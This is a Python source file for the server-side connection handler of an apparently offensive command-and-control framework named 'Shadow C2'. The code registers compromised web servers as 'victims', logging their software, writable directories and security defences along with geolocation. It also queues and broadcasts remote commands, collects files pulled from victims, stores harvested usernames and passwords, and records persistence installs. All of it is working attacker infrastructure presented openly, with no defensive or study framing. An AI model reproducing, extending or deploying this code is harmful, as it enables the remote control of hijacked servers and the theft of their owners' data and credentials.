#!/usr/bin/env python3
"""
Shadow C2 — C2 Connection Handler
Central manager for victim communications across all channels.
"""

import time
import threading
import logging
from typing import Optional, List, Dict, Any

from server.database import DatabaseManager
from server.c2.crypto import C2Crypto
from server.utils.geo import geolocate_ip

logger = logging.getLogger("shadow_c2.handler")


class C2Handler:
    """
    Manages all C2 communications:
    - Victim registration and tracking
    - Command queuing and dispatch
    - Multi-channel routing with failover
    - File transfer coordination
    """

    def __init__(self, db: DatabaseManager, crypto: C2Crypto):
        self.db = db
        self.crypto = crypto
        self.channels: Dict[str, Any] = {}              # {channel_type: channel_instance}
        self.victim_channels: Dict[str, List[str]] = {}  # {uuid: [channel_types]}
        self._callbacks: Dict[str, list] = {}            # {event: [callback_fns]}
        self._lock = threading.Lock()

    # -- channel management --------------------------------------------------

    def register_channel(self, channel_type: str, channel_instance):
        """Register a C2 channel (https, dns, ws, icmp, social)."""
        self.channels[channel_type] = channel_instance
        logger.info(f"Channel registered: {channel_type}")

    def get_channel(self, channel_type: str):
        return self.channels.get(channel_type)

    # -- event system --------------------------------------------------------

    def on(self, event: str, callback):
        """Register event callback."""
        if event not in self._callbacks:
            self._callbacks[event] = []
        self._callbacks[event].append(callback)

    def emit(self, event: str, data: dict = None):
        """Fire event callbacks."""
        for cb in self._callbacks.get(event, []):
            try:
                cb(data or {})
            except Exception as e:
                logger.error(f"Callback error for {event}: {e}")

    # -- victim registration -------------------------------------------------

    def handle_registration(self, data: dict, source_ip: str = "") -> dict:
        """
        Process new victim registration.
        data keys: uuid, ip, hostname, os, arch, php_version, server_software,
                   document_root, writable_dirs, disabled_functions,
                   cms_detected, waf_detected
        Returns response dict for the victim.
        """
        uuid = data.get("uuid", "")
        if not uuid:
            return {"status": "error", "message": "missing uuid"}

        ip = data.get("ip", source_ip)

        # Geolocate
        geo = geolocate_ip(ip)

        # Store in DB
        victim_id = self.db.add_victim(
            uuid=uuid,
            ip=ip,
            hostname=data.get("hostname", ""),
            os_name=data.get("os", ""),
            arch=data.get("arch", ""),
            php_version=data.get("php_version", ""),
            server_software=data.get("server_software", ""),
            document_root=data.get("document_root", ""),
            writable_dirs=data.get("writable_dirs", ""),
            disabled_functions=data.get("disabled_functions", ""),
            cms_detected=data.get("cms_detected", ""),
            waf_detected=data.get("waf_detected", ""),
            latitude=geo.get("latitude", 0.0),
            longitude=geo.get("longitude", 0.0),
            country=geo.get("country", ""),
            city=geo.get("city", ""),
        )

        # Initialize key exchange
        key_data = self.crypto.initiate_key_exchange(uuid)

        # Log
        self.db.log_action("registration", f"New victim: {uuid} ({ip})", ip)

        # Fire event
        self.emit("new_victim", {
            "uuid": uuid, "ip": ip,
            "hostname": data.get("hostname", ""),
            "country": geo.get("country", ""),
        })

        logger.info(f"Victim registered: {uuid} @ {ip} ({geo.get('country', '?')})")

        return {
            "status": "registered",
            "key_exchange": key_data,
            "tasks": [],
        }

    # -- beacon handling -----------------------------------------------------

    def handle_beacon(self, data: dict) -> dict:
        """
        Process heartbeat from victim.
        Returns pending commands.
        """
        uuid = data.get("uuid", "")
        if not uuid:
            return {"tasks": []}

        # Touch victim (update last_seen)
        self.db.touch_victim(uuid)

        # Get pending commands
        pending = self.db.get_pending_commands_by_uuid(uuid)

        tasks = []
        cmd_ids = []
        for cmd in pending:
            tasks.append({
                "id": cmd["id"],
                "command": cmd["command_text"],
            })
            cmd_ids.append(cmd["id"])

        # Mark as sent
        if cmd_ids:
            self.db.mark_commands_sent(cmd_ids)

        return {"tasks": tasks}

    # -- result handling -----------------------------------------------------

    def handle_result(self, data: dict) -> dict:
        """Process command result from victim."""
        uuid = data.get("uuid", "")
        task_id = data.get("task_id")
        output = data.get("output", "")
        status = data.get("status", "completed")

        if task_id:
            self.db.update_command(task_id, status, output)
            self.db.log_action("command_result",
                               f"Task {task_id} from {uuid}: {status}", "")
            # Fire event for dashboard
            self.emit("command_result", {
                "uuid": uuid,
                "task_id": task_id,
                "output": output,
                "status": status,
            })

        # Touch victim
        if uuid:
            self.db.touch_victim(uuid)

        return {"status": "received"}

    # -- command queuing -----------------------------------------------------

    def queue_command(self, victim_uuid: str, command: str) -> int:
        """Add a command to the queue for a victim. Returns command ID."""
        victim = self.db.get_victim_by_uuid(victim_uuid)
        if not victim:
            return -1

        cmd_id = self.db.add_command(victim["id"], command)
        self.db.log_action("command_queued",
                           f"Command for {victim_uuid}: {command[:100]}", "")

        logger.info(f"Command queued for {victim_uuid}: {command[:50]}...")
        return cmd_id

    def broadcast_command(self, command: str, tag_filter: str = None) -> list:
        """Send command to all victims (optionally filtered by tag)."""
        victims = self.db.list_victims(status="active", tag=tag_filter)
        cmd_ids = []
        for v in victims:
            cid = self.db.add_command(v["id"], command)
            cmd_ids.append(cid)

        self.db.log_action("broadcast",
                           f"Broadcast to {len(cmd_ids)} victims: {command[:100]}", "")
        return cmd_ids

    # -- file operations -----------------------------------------------------

    def handle_file_upload(self, victim_uuid: str, filename: str,
                           file_data: bytes, remote_path: str = "") -> dict:
        """Handle file upload from victim."""
        import os
        from server.config import DOWNLOAD_DIR
        from server.utils.crypto_utils import sha256_hash

        victim = self.db.get_victim_by_uuid(victim_uuid)
        if not victim:
            return {"status": "error", "message": "unknown victim"}

        # Save file
        victim_dir = os.path.join(DOWNLOAD_DIR, victim_uuid)
        os.makedirs(victim_dir, exist_ok=True)
        local_path = os.path.join(victim_dir, filename)

        with open(local_path, "wb") as f:
            f.write(file_data)

        file_hash = sha256_hash(file_data)
        file_id = self.db.add_file(
            victim_id=victim["id"],
            filename=filename,
            direction="download",
            local_path=local_path,
            remote_path=remote_path,
            size=len(file_data),
            sha256=file_hash,
        )

        self.db.log_action("file_upload",
                           f"File from {victim_uuid}: {filename} ({len(file_data)} bytes)", "")

        return {"status": "uploaded", "file_id": file_id}

    def handle_file_download_request(self, victim_uuid: str,
                                     remote_path: str) -> dict:
        """Queue a file download command for a victim."""
        cmd_id = self.queue_command(victim_uuid, f"__download__{remote_path}")
        return {"status": "queued", "task_id": cmd_id}

    # -- credential handling -------------------------------------------------

    def handle_credentials(self, data: dict) -> dict:
        """Store discovered credentials."""
        uuid = data.get("uuid", "")
        creds = data.get("credentials", [])

        victim = self.db.get_victim_by_uuid(uuid)
        if not victim:
            return {"status": "error"}

        count = 0
        for c in creds:
            self.db.add_credential(
                victim_id=victim["id"],
                service=c.get("service", ""),
                host=c.get("host", ""),
                port=c.get("port", 0),
                username=c.get("username", ""),
                password=c.get("password", ""),
                database_name=c.get("database_name", ""),
            )
            count += 1

        self.db.log_action("credentials_found",
                           f"{count} creds from {uuid}", "")

        self.emit("credentials_found", {"uuid": uuid, "count": count})
        return {"status": "received", "count": count}

    # -- persistence ---------------------------------------------------------

    def handle_persistence(self, data: dict) -> dict:
        """Record persistence installation."""
        uuid = data.get("uuid", "")
        victim = self.db.get_victim_by_uuid(uuid)
        if not victim:
            return {"status": "error"}

        self.db.add_persistence(
            victim_id=victim["id"],
            method=data.get("method", ""),
            details=data.get("details", ""),
            status=data.get("status", "installed"),
        )

        self.db.log_action("persistence",
                           f"{data.get('method', '')} on {uuid}", "")
        return {"status": "recorded"}

    # -- key exchange completion ---------------------------------------------

    def handle_key_exchange(self, data: dict) -> dict:
        """Complete ECDH key exchange with victim."""
        uuid = data.get("uuid", "")
        client_pub = data.get("client_public_key", "")

        if self.crypto.complete_key_exchange(uuid, client_pub):
            return {"status": "exchanged", "key_id": self.crypto.get_session(uuid).key_id.hex()}
        return {"status": "error", "message": "key exchange failed"}

    # -- victim status -------------------------------------------------------

    def get_victim_status(self, victim_uuid: str) -> dict:
        """Get detailed victim status."""
        victim = self.db.get_victim_by_uuid(victim_uuid)
        if not victim:
            return {"status": "unknown"}

        return {
            "victim": victim,
            "pending_commands": len(self.db.get_pending_commands(victim["id"])),
            "channels": self.db.get_c2_channels(victim["id"]),
            "persistence": self.db.get_persistence(victim["id"]),
            "has_encryption": self.crypto.has_session(victim_uuid),
        }

    def list_active_victims(self) -> list:
        """List all active victims."""
        return self.db.list_victims(status="active")

    # -- maintenance ---------------------------------------------------------

    def cleanup_dead_victims(self, timeout: int = 7200):
        """Mark victims as dead/dormant based on last beacon."""
        self.db.cleanup_dead_victims(timeout)

    def select_best_channel(self, victim_uuid: str) -> Optional[str]:
        """Select the best available channel for a victim."""
        victim = self.db.get_victim_by_uuid(victim_uuid)
        if not victim:
            return None

        channels = self.db.get_c2_channels(victim["id"])
        for ch in sorted(channels, key=lambda x: x.get("priority", 99)):
            ch_type = ch.get("channel_type", "")
            if ch_type in self.channels and ch.get("status") == "active":
                return ch_type

        # Default to HTTPS
        return "https" if "https" in self.channels else None
